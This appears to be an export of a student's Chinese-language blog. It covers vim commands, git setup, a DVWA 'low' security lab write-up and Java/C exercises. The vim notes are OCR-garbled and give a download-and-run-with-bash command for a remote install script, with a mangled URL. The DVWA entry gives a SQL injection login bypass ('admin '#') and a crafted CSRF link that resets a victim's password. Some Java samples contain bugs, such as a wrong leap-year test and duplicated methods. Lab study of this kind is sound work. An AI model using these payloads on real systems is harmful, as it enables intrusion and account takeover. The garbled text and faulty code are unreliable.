:例如,[6yy]表示拷贝从光标所在的该行”往下数”6行文字。</p></li><li><p>[p]︰将缓冲区内的字符贴到光标所在位置。注意:所有与”y”有关的复制命令都必须与”p”配合才能完成复制与粘贴功能。[重要]</p></li></ul></li><li><p>替换</p><ul><li>[r]︰替换光标所在处的字符。</li><li>.[R ]:香交元粽所至芝媒富拿es，直到接下 [ESC]</li></ul></li><li><p>销上一次操作</p><ul><li>[u]∶如果您误执行一个命令，可以马上按下0l<br>回到上、个操作。按多次“u”可以执行多次回复。<br>[重要]</li><li>.[ctrl+r]:撤销的恢复「[重要]</li></ul></li><li><p>更改</p><ul><li>.[c]:更改光标所在处到字尾处</li><li>.[c#w]︰例如，[c3w]表示更攻个字</li></ul></li><li><p>跳至指定的行</p><ul><li>[ctrl] + [g]: 列出光标所夺行的接往号。[重要]</li><li>[#G]︰例如，[15G]，表示移动光标至文章的第15行行首。</li></ul></li></ul><h3 id="vim末行模式命令集"><a href="#vim末行模式命令集" class="headerlink" title="vim末行模式命令集"></a>vim末行模式命令集</h3><p>在使用末行模式之前，请记住先按「ESC」键确定您已经处于正常模式，再按「:」冒号即可进入末行模式。</p><ul><li>列出行号<ul><li>[set nu] :输入[set nu]后，会在文件中的每一行前面列出行号。[重要]跳到文件中的某一行</li><li>[#] :[#]号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再<br>回车，就会跳到文章的第15行。</li></ul></li><li>查找字符<ul><li>[&#x2F;关键字]∶先按[&#x2F;]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往后寻找到您要的关键字为止。</li><li>[?关键字]︰先按[?]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往前寻找到您要的关键字为止。</li><li>问题:&#x2F;和?查找有和区别?操作实验一下</li></ul></li><li>保存文件[重要]<ul><li>.[w]:在冒号输入字母[w]就可以将文件保存起来</li></ul></li><li>离开vim[重要]<ul><li>[q]︰按[q]就是退出，如果无法离开vim，可以在「q」后跟一个[!]强制离开vim。</li><li>.[wq] :一般建议离开时，搭配[w]一起使用，这样在退出的时候还可以保存文件。</li></ul></li><li>两个桌面光标切换<ul><li>按住CTRL +两下w</li></ul></li><li>！+gcc&#x2F;man等命令<ul><li>例如！gcc test.c</li></ul></li></ul><h3 id="vim操作总结"><a href="#vim操作总结" class="headerlink" title="vim操作总结"></a>vim操作总结</h3><ul><li><p>三种模式</p><ul><li>正常模式</li><li>插入模式</li><li>底行模式</li></ul></li><li><p>vim操作</p><ul><li>打开，关闭，查看，查询，插入，删除，替换，撤销，复制等等操作。</li></ul></li></ul><h3 id="简单vim配置"><a href="#简单vim配置" class="headerlink" title="简单vim配置"></a>简单vim配置</h3><h4 id="自动配置-https-github-com-askunix-VimForCpp"><a href="#自动配置-https-github-com-askunix-VimForCpp" class="headerlink" title="[自动配置][https://github.com/askunix/VimForCpp]"></a>[自动配置][<a href="https://github.com/askunix/VimForCpp]">https://github.com/askunix/VimForCpp]</a></h4><p>保证自己联网的情况下，命令行直接运行，一键部署</p><pre><code>curl - sLfhttps://gitee,conHGtz2222/vimForcpp/raw/master/insta1l.sh -o ./insta11.sh &amp;&amp; bash./install.sh</code></pre><h4 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h4><ul><li>在目录&#x2F;etcl下面，有个名为vimrc的文件，这是系统中公共的vim配置文件，对所有用户都有效。</li><li>而在每个用户的主目录下，都可以自己建立私有的配置文件，命名为: “.vimrc”。例如，&#x2F;root目录下，通常已经存在一个.vimrc文件,如果不存在，则创建之。</li><li>切换用户成为自己执行su，进入自己的主工作目录,执行cd ~</li><li>打开自己目录下的.vimrc文件，执行vim .vimrc</li></ul><h4 id="常用配置选项，用来测试"><a href="#常用配置选项，用来测试" class="headerlink" title="常用配置选项，用来测试"></a>常用配置选项，用来测试</h4><ul><li>设置语法高亮: syntax on</li><li>显示行号: set nu</li><li>设置缩进的空格数为4: set shiftwidth&#x3D;4</li></ul><h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h4><p>要配置好看的vim，原生的配置可能功能不全，可以选择安装插件来完善配置，保证用户是你要配置的用户，接下来:</p><ul><li>安装TagList插件,下载taglist_xx.zip ,解压完成，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>l.vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加: let Tlist_show_one_File&#x3D;1(let Tlist_Exit_on1ywindow&#x3D;1) letTlist_use_Right_window&#x3D;1</li><li>安装文件浏览器和窗口管理器插件: WinManager</li><li>下载winmanager.zip，2.x版本以上的</li><li>解压winmanager.zip，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>&#x2F; .vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加let g:winManagerwindowLayout&#x3D;‘FileExplorer|TagListnmap wm: wMToggle<cr></li><li>然后重启vim,打开<del>&#x2F;XXX.c或</del>&#x2F;XXX.cpp,在normal状态下输入”wm”,你将看到上图的效果。更具体移步:[点我][<a href="https://blog.csdn.net/wooin/article/details/1858917],%E5%85%B6%E4%BB%96%E6%89%8B%E5%86%8C%EF%BC%8C%E8%AF%B7%E6%89%A7%E8%A1%8Cvimtutor%E5%91%BD%E4%BB%A4%E3%80%82">https://blog.csdn.net/wooin/article/details/1858917],其他手册，请执行vimtutor命令。</a></li></ul><h3 id="vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn"><a href="#vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn" class="headerlink" title="[vim参考资料][https://github.com/wsdjeg/vim-galore-zh_cn]"></a>[vim参考资料][<a href="https://github.com/wsdjeg/vim-galore-zh_cn]">https://github.com/wsdjeg/vim-galore-zh_cn]</a></h3><h2 id="ubuntu中安装git"><a href="#ubuntu中安装git" class="headerlink" title="ubuntu中安装git"></a>ubuntu中安装git</h2><pre><code>sudo apt-get install git</code></pre><pre><code>(base) youzipii@youzipii-virtual-machine:~$ gitusage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value]           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]           &lt;command&gt; [&lt;args&gt;]</code></pre><h2 id="Linux编辑器-gcc-x2F-g-使用"><a href="#Linux编辑器-gcc-x2F-g-使用" class="headerlink" title="Linux编辑器-gcc&#x2F;g++使用"></a>Linux编辑器-gcc&#x2F;g++使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA low</title>
      <link href="/2023/07/21/DVWA/"/>
      <url>/2023/07/21/DVWA/</url>
      
        <content type="html"><![CDATA[<h3 id="方法二：SQL注入"><a href="#方法二：SQL注入" class="headerlink" title="方法二：SQL注入"></a>方法二：SQL注入</h3><pre><code class="PHP">&lt;?phpif( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;    // Get username    $user = $_GET[ &#39;username&#39; ];    // Get password    $pass = $_GET[ &#39;password&#39; ];    $pass = md5( $pass );    // Check the database    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row[&quot;avatar&quot;];        // Login successful        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;    &#125;    else &#123;        // Login failed        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; </code></pre><p>通过观察上面的代码可以发现在下面语句</p><pre><code class="PHP">$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;</code></pre><p>可以通过admin ‘#绕过</p><p><img src="https://img1.imgtp.com/2023/07/21/CJFqwv9N.png" alt="9.png"></p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令注入,是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><p>源代码</p><pre><code class="PHP">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; </code></pre><p><a href="https://www.runoob.com/php/func-string-stristr.html">PHP stristr()函数</a><br><a href="https://www.php.net/manual/zh/function.php-uname.php">PHP php_uname()函数</a><br>ping -c 4 这里的4是指设置完成要求回应的次数。</p><p><img src="https://img1.imgtp.com/2023/07/21/0F3N7LJr.png" alt="1689930000890.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造漏洞</p><p>本质就是在不知情的情况下执行请求<br>GET和POST俩种类型<br>主要是看抓包能不能抓到参数并且修改</p><pre><code class="PHP">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; </code></pre><p>这里可以通过构造链接的方法：<br><a href="http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成123456<br><img src="https://s2.loli.net/2023/07/23/T9NcIxyGHjvKJrQ.png" alt="image.png"><br>但这种连接容易被人看出来，也可以通过写一个简单的html页面来攻击<br>因为前面改了123456所以这里用password<br>这时用123456来登陆就不行了<br><img src="https://s2.loli.net/2023/07/23/GRE7Hk1uzSTVPYo.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java随笔</title>
      <link href="/2023/05/29/java%E9%9A%8F%E7%AC%94/"/>
      <url>/2023/05/29/java%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<h1 id="和1与，看是否为0，判断32次"><a href="#和1与，看是否为0，判断32次" class="headerlink" title="和1与，看是否为0，判断32次"></a>和1与，看是否为0，判断32次</h1><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    int a;    scanf(&quot;%d&quot;, &amp;a);    int i = 0;    int count = 0;    for (i = 0; i &lt; 32; i++) &#123;        if (a &amp; 1 == 1)            count++;        a = a &gt;&gt; 1;     &#125;     printf(&quot;%d &quot;, count);    return 0; &#125; </code></pre><pre><code class="java">    Scanner sc = new Scanner(System.in);       int count = 0;       int a = sc.nextInt();       for (int i = 0; i &lt; 32; i++) &#123;       if ((a &amp; 1) == 1)                count++;            a &gt;&gt;= 1;        &#125;        sc.close();        System.out.println(&quot;1的个数为 &quot; + count);                //另一种写法        int n = 15        int cc = 0;        while (n != 0) &#123;            if ((n &amp; 1) != 0) &#123;                cc++;            &#125;            n &gt;&gt;&gt;= 1;        &#125;</code></pre><h2 id="妙妙方法"><a href="#妙妙方法" class="headerlink" title="妙妙方法"></a>妙妙方法</h2><p>一个数字与上这个数字减一的数，该数二进制最右边的1必然会消除掉，以此类推，从右往左，每一次进行按位与操作，都会取消掉一个1，直到该数字变为0，跳出循环，就得到了该数字二进制中1的个数。<br>以21(0001 0011)为例：</p><p>0001 0011</p><p>0001 0010</p><p>0001 0010 第一次与的结果 </p><p>0001 0001 </p><p>0001 0000 第二次与的结果</p><p>0000 1111</p><p>0000 0000 第三次与的结果，跳出循环，count &#x3D; 3;</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    int a;    scanf(&quot;%d&quot;, &amp;a);    int i = 0;    int count = 0;    while (a != 0) &#123;        a = a &amp; (a - 1);        count++;     &#125;    printf(&quot;%d &quot;, count);    return 0; &#125; </code></pre><pre><code class="java">    int n = 15;    int ccc = 0;    while (n != 0) &#123;        n = n &amp; (n - 1);        ccc++;    &#125;    System.out.println(ccc);</code></pre><h1 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h1><pre><code class="Java">    int a = 0;    int b = 0;    int c = 0;    for (int i = 100; i &lt; 1000; i++) &#123;        a = i % 10;        b = i / 10 % 10;        c = i / 100;        if (Math.pow(a, 3) + Math.pow(b, 3) + Math.pow(c, 3) == i)            System.out.println(i);    &#125;</code></pre><pre><code class="Java">    int tmp = 0;        for (int i = 100; i &lt; 999; i++) &#123;            int tem1 = i;            while(tem1 != 0) &#123;                tmp += Math.pow(tem1 % 10, 3);                tem1 /= 10;            &#125;            if (tmp == i)                System.out.println(tmp);            tmp = 0;        &#125;</code></pre><h2 id="拓展：一个整数的各个位数的位数次方"><a href="#拓展：一个整数的各个位数的位数次方" class="headerlink" title="拓展：一个整数的各个位数的位数次方"></a>拓展：一个整数的各个位数的位数次方</h2><pre><code class="Java">for (int i = 1; i &lt; 999999; i++) &#123;            int count = 0; //记录位数            int tmp = i; //保存i值，以免影响for循环            while (tmp != 0) &#123;                tmp /= 10;                count++;            &#125;            tmp = i;//再次用来求各个位数            int sum = 0; //保存各个位数的位数次方            while( tmp != 0 ) &#123;                sum += Math.pow(tmp % 10, count);                tmp /= 10;            &#125;            if (sum == i)                System.out.println(i);        &#125;</code></pre><h1 id="5-30学习笔记"><a href="#5-30学习笔记" class="headerlink" title="5_30学习笔记"></a>5_30学习笔记</h1><pre><code class="Java">/** * Created with IntelliJ IDEA * Description * User: yxz * Data: 2023-05-30 * Time: 14:12 */import java.util.Scanner;public class test530 &#123;    public static void main8(String[] args) &#123;        /* 求最大公约数 */         Scanner sc = new Scanner(System.in);         int a = sc.nextInt();         int b = sc.nextInt();        int rand = a % b;         while(rand != 0) &#123;             a = b;             b = rand;             rand = a % b;         &#125;        System.out.println(b);    &#125;    public static void main7(String[] args) &#123;        /* 判断素数方法2 */        int n = 2;        int i = 2;        for (;i &lt; Math.sqrt(n); i++) &#123;            if (n % i == 0) &#123;                System.out.println(&quot;不是素数&quot;);                break;            &#125;        &#125;        if (i &gt; Math.sqrt(n)) &#123;            System.out.println(&quot;是素数&quot;);        &#125;    &#125;    public static void main6(String[] args) &#123;        /* 判断素数 */        int n = 7;        int i = 2;        for (; i &lt;= n / 2; i++) &#123;            if (n % i == 0) &#123;                System.out.println(&quot;不是素数&quot;);                break;            &#125;        &#125;        if (i &gt; n / 2) &#123;            System.out.println(&quot;是素数&quot;);        &#125;    &#125;    public static void main5(String[] args) &#123;        /* 输出整数的2进制 偶数位序列 奇数位序列 */        Scanner sc = new Scanner(System.in);        int a = sc.nextInt();        for (int i = 31; i &gt;= 1; i -= 2) &#123;            System.out.print(((a &gt;&gt; i) &amp; 1) + &quot; &quot;);        &#125;//偶数位        System.out.println();        for (int i = 30; i &gt;=1; i -= 2) &#123;            System.out.print(((a &gt;&gt; i) &amp; 1) + &quot; &quot;);        &#125;//奇数位    &#125;    public static void main4(String[] args) &#123;        /*  输入密码 */        Scanner sc = new Scanner(System.in);        int count = 3;        while (count != 0) &#123;            System.out.println(&quot;请输入你的密码,共有&quot; + count + &quot;次机会!&quot;);            String pass = sc.nextLine();            if (pass.equals(&quot;123&quot;)) &#123;                System.out.println(&quot;登陆成功&quot;);                break;            &#125; else &#123;                System.out.println(&quot;密码错误&quot;);            &#125;            count--;        &#125;    &#125;    public static void main3(String[] args) &#123;        /* 输出整数的每一位 */        Scanner sc = new Scanner(System.in);        while (sc.hasNextInt()) &#123;            int n = sc.nextInt();            while (n != 0) &#123;                System.out.print( n % 10);                n /= 10;            &#125;        &#125;    &#125;    public static void main2(String[] args) &#123;        /* 乘法口诀表 */        for (int i = 1; i &lt;= 9; i++) &#123;            for (int j = 1; j &lt;= i; j++) &#123;                System.out.print(i + &quot;*&quot; + j + &quot;=&quot; + i * j + &quot; &quot;);            &#125;            System.out.println();        &#125;    &#125;    public static void main1(String[] args) &#123;        /* X形图案 */        Scanner sc = new Scanner(System.in);        while (sc.hasNextInt()) &#123;            int n = sc.nextInt();            for (int i = 0; i &lt; n; i++) &#123;                for (int j = 0; j &lt; n; j++) &#123;                    if ((i == j) || (i + j == n - 1)) &#123;                        System.out.print(&#39;*&#39;);                    &#125; else &#123;                        System.out.print(&quot; &quot;);                    &#125;                &#125;                System.out.println();            &#125;        &#125;    &#125;&#125;</code></pre><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><pre><code class="JAVA">/** * Created with IntelliJ IDEA * Description * User: yxz * Data: 2023-05-30 * Time: 16:11 */public class fangfa1 &#123;    //闰年    public static boolean isiLeapYear(int year) &#123;        if ((year % 4 == 0) &amp;&amp; (year % 100 != 0) || (year % 400 == 9)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    //    //方法定义    //修饰符 返回值类型 方法名称([参数类型 形参])&#123;    // 方法代码块    //[return 返回值];    // &#125;    public static void add(int a, int b) &#123;        System.out.println(a + b);    &#125;    public static void main1(String[] args) &#123;        int x = 1;        int y = 1;        int year = 2021;        //System.out.println(isiLeapYear(year));        //int ret = add(x, y);//实际参数 ret：接收方法得返回值    &#125;&#125;</code></pre><h1 id="方法的重载与重写的区别"><a href="#方法的重载与重写的区别" class="headerlink" title="方法的重载与重写的区别"></a>方法的重载与重写的区别</h1><p>方法重写是存在子父类之间的,子类定义的方法与父类中的方法具有相同的方法名字,相同的参数表和相同的返回类型 </p><p>方法重载是指同一个类中的多个方法具有相同的名字,但这些方法具有不同的参数列表,即参数的数量或参数类型不能完全相同</p><ol><li>方法的名称必须一样</li><li>方法的参数不一样 [数据类型， 个数， 顺序]</li><li>返回值没有要求</li><li>签名使得同名的方法可以区别</li></ol><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><pre><code class="Java">/** * Created with IntelliJ IDEA * Description * User: yxz * Data: 2023-05-30 * Time: 20:20 */public class digui &#123;    /**     * 汉诺塔     * @param pos1 起始位置     * @param pos2 中转位置     * @param pos3 目标位置     * @param n     */    public static void hanio(int n, char pos1, char pos2, char pos3) &#123;        if (n == 1) &#123;            move(pos1, pos3);            return;        &#125;        hanio(n - 1, pos1, pos3, pos2);        move(pos1, pos3);        hanio(n - 1, pos2, pos1, pos3);    &#125;    /**     *     * @param pos1 起始位置     * @param pos2 目标位置     */    public static void move(char pos1, char pos2) &#123;        System.out.print(pos1 + &quot; -&gt; &quot; + pos2 + &quot; &quot;);    &#125;    //求1 +...+n;    public static int fun2(int n) &#123;        if (n == 1) &#123;            return 1;        &#125;        return n + fun2(n - 1);    &#125;    public static void main2(String[] args) &#123;        hanio(1, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;);        System.out.println();        hanio(2, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;);        System.out.println();        hanio(3, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;);        System.out.println();    &#125;    //求1 +...+n;    public static int fun2(int n) &#123;        if (n == 1) &#123;            return 1;        &#125;        return n + fun2(n - 1);    &#125;    //求数字的各位数之和    public static int sum(int n) &#123;        if (n &lt; 10) &#123;            return n;        &#125;        int tmp = n % 10 + sum(n / 10);        return tmp;    &#125;    //按顺序打印数字的每一位,    public static void print(int num) &#123;        if (num &gt; 9) &#123;            print(num / 10);            &#125;            System.out.println(num % 10);        &#125;        //阶乘    public static int fac(int n) &#123;        if (n == 1) &#123;            return 1;        &#125;        int tmp = n * fac(n - 1);        return tmp;    &#125;    public static void main3(String[] args) &#123;        System.out.println(fac(5));    &#125;    public static void function(int a) &#123;        if (a == 1) &#123;            System.out.println(a);            return;        &#125;        function(a - 1);        System.out.println(a);    &#125;    public static void main2(String[] args) &#123;        function(10);    &#125;    /**     * 求俩个整数的最大值     * @param a     * @param b     * @return     */    public static int max2(int a, int b) &#123;        return a &gt; b ? a : b;    &#125;    /**     * 求三个数的最大值     * @param a     * @param b     * @param c     * @return     */    public static int max3(int a, int b, int c) &#123;        int max = max2(a, b);        return max &gt; c ? max : c;    &#125;    //重载写法    public static int max(int a, int b, int c) &#123;        int ret = max2(a, b);        return ret &gt; c ? ret : c;    &#125;    //fib    public static int fib(int n) &#123;        int f1 = 1;        int f2 = 1;        int f3 = 1;        for (int i = 3; i &lt;= n; i++) &#123;            f3 = f1 + f2;            f1 = f2;            f2 = f3;        &#125;        return f3;    &#125;    public static int fib1(int n) &#123;        if (n == 1 || n == 2) &#123;            return 1;        &#125; else &#123;            return fib1(n - 1)  +  fib( n - 2);        &#125;    &#125;    public static void main1(String[] args) &#123;        System.out.println(fib1(1));        System.out.println(fib1(2));        System.out.println(fib1(5));    &#125;&#125;</code></pre><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是有一种引用数据类型</p><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><pre><code class="JAVA">public class Arr &#123;    public static void main(String[] args) &#123;        int[] arr1 = &#123;1,2,3&#125;;        for (int i = 0; i &lt; arr1.length; i++) &#123;            System.out.print(arr1[i] + &quot; &quot;);        &#125;        System.out.println();        // 数组当中数据类型定义的变量  : 数组名 ，但拿不到数组下标        for (int x: arr1) &#123;            System.out.print(x + &quot; &quot;);        &#125;        System.out.println();        //专门用来操作数组 Array 需要导入一个包        //把数组转变为字符串，然后返回        String ret = Arrays.toString(arr1);        System.out.println(ret);    &#125;    public static void main2(String[] args) &#123;        double arr1[] = new double[1];//0.0        float arr2[] = new float[1];//0.0f        System.out.println(arr1[0]);        System.out.println(arr2[0]);    &#125;    public static void main1(String[] args) &#123;        int a1 = 1;        int a2 = 2;        int a3 = 3;        int[] arr = &#123;a1, a2, a3&#125;;        int[] arr2 = &#123;1, 2, 3&#125;;//直接赋值        int[] arr3 = new int[]&#123;1,2,3,4&#125;;//动态初始化        //没有本质区别，只有写法上的区别.        int[] arr4 = new int[10];//分配空间，默认值0或0.0,boolean是false        System.out.println(arr4[1]);        int len = arr3.length;        System.out.println(arr[2]);        System.out.println(len);    &#125;</code></pre><h2 id="数组（引用类型和应用场景）"><a href="#数组（引用类型和应用场景）" class="headerlink" title="数组（引用类型和应用场景）"></a>数组（引用类型和应用场景）</h2><p><img src="https://s2.loli.net/2023/06/04/KaNcYtfUGvEML1r.png" alt="image.png"></p><ul><li><p><em>程序计数器</em>（PC Register）：只是一个很小的空间，保存下一条执行的指令的地址</p></li><li><p><em>虚拟机栈</em>（JVM Stack）：与方法调用相关的一些信息，每个方法在执行时，都会先创建一个栈帧，栈帧中包含有：局部变量表、操作数栈、动态链接、返回地址以及其他的一些信息，保存的都是与方法执行时相关的一些信息。比如：局部变量。当方法运行结束后，栈帧就被销毁了，即栈帧中保存的数据也被销毁了。</p></li><li><p><em>本地方法栈</em>（Native Method Stack）：本地方法栈与虚拟机栈的作用类似.只不过保存的内容是Native方法的局部变量.在有些版本的JVM实现中（例如HotSpot），本地方法栈和虚拟机栈是一起的</p></li><li><p><em>堆</em>（Heap）：JVM所管理的最大内存区域．使用new 创建的对象都是在堆上保存（例如前面的 new int［］（1，2，31），堆是随着程序开始运行时而创建，随着程序的退出而销毁，堆中的数据只要还有在使用，就不会被销毁。</p></li><li><p><em>方法区</em>（Method Area）：用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据.方法编译出的的字节码就是保存在这个区域</p></li></ul><p>现在我们只简单关心堆和虚拟机栈这两块空间，后序JVM中还会更详细介绍。</p><p><img src="https://s2.loli.net/2023/06/04/XHIdJgRlSf8wWvZ.png" alt="image.png"></p><pre><code class="java">public class Arr &#123;    public static void main7(String[] args) &#123;        int[] arr = null;//引用对象的0值，代表这个引用不指向任何对象        //System.out.println(arr[0]);没对象，哪来的长度,空指针异常        //所以不能进行读写操作，否则抛出NullPointException        System.out.println(arr);    &#125;    public static void main6(String[] args) &#123;       //一个引用不能指向多个对象，但一个对象可以被多个引用指向        int[] arr = &#123;1,2,3,4&#125;;        int[] arr2 = &#123;3,4,5,7&#125;;        arr = arr2; //arr没了，此时没人引用&#123;1，2，3，4&#125;就自动回收了        System.out.println(Arrays.toString(arr));//[3, 4, 5, 7]        System.out.println(Arrays.toString(arr2));//[3, 4, 5, 7]    &#125;    public static void main5(String[] args) &#123;        int[] arr = &#123;1,2,3,4&#125;;        System.out.println(Arrays.toString(arr));        int[] arr2 = arr;//arr2这个引用指向了arr引用所引用的对象        arr2[1] = 99;//改arr2 arr也会变        System.out.println(Arrays.toString(arr));//[1, 99, 3, 4]        System.out.println(Arrays.toString(arr2));//[1, 99, 3, 4]    public static void main4(String[] args) &#123;        int[] arr = new int[100];        for (int i = 0; i &lt; arr.length; i++) &#123;            arr[i] = i + 1;        &#125;        System.out.println(Arrays.toString(arr));    &#125;&#125;</code></pre><h2 id="数组的应用场景"><a href="#数组的应用场景" class="headerlink" title="数组的应用场景"></a>数组的应用场景</h2><pre><code class="Java">public static void func1(int[] arr) &#123;        arr = new int[10];        //System.out.println(Arrays.toString(arr));[0...0]    &#125;    public static void func2(int[] arr) &#123;        arr[0] = 99;    &#125;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4&#125;;        func1(arr);        System.out.println(Arrays.toString(arr));//[1,2,3,4]        func2(arr);        System.out.println(Arrays.toString(arr));//[1,2,3,4]    &#125;</code></pre><p><img src="https://s2.loli.net/2023/06/04/fK4B8Q6mEdYbo5N.png" alt="image.png"></p><pre><code class="java">// int[] arr = &#123; 1, 2,3 ,4&#125;;//整体初始化只有一次机会！就是在定义的同时初始化；public static void swap(int[] array) &#123;        int tmp = array[0];        array[0] = array[1];        array[1] = tmp;    &#125;    public static void main(String[] args) &#123;        int[] tmp = &#123; 1, 2&#125;;        System.out.println(&quot;交换前： &quot; + tmp[0] + &quot; &quot; + tmp[1]);        swap(tmp);        System.out.println(&quot;交换后： &quot;+ tmp[0] + &quot; &quot; + tmp[1]);    &#125;    public static int[] func3() &#123;//返回一整个数组        int[] tmp = &#123;1,2,3,4,5,6,7,8,9&#125;;        return tmp;    &#125;    public static void main2(String[] args) &#123;        int[] ret = func3();        System.out.println(Arrays.toString(ret));    &#125;</code></pre><ol><li>数组对象是在堆上的</li><li>引用变量目前是在main函数里面的，属于局部变量，当函数结束或就会被收回内存</li><li>是变量被回收后，对象没人引用了，自动回收了，fun函数里的地址和main函数里的地址不同，fun里的回收后，对象还在，但fun里有队arr的操作会保存下来，因为对象被改变了。</li></ol><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="数组转字符串"><a href="#数组转字符串" class="headerlink" title="数组转字符串"></a>数组转字符串</h4><pre><code class="Java">public static String myToString(int[] tmp) &#123;        if (tmp == null) &#123;            return &quot;null&quot;;        &#125; else &#123;            String ret = &quot;[&quot;;            for (int i = 0; i &lt; tmp.length; i++) &#123;                ret = ret + tmp[i];                if (i != tmp.length - 1) &#123;                    ret += &quot;,&quot;;                &#125;            &#125;            ret = ret + &quot;]&quot;;            return ret;        &#125;    &#125;    public static void main(String[] args) &#123;        int[] array = &#123;1, 2, 3, 4&#125;;        int[] arr2 = null;        String ret1 = myToString(array);        String ret2= myToString(arr2);        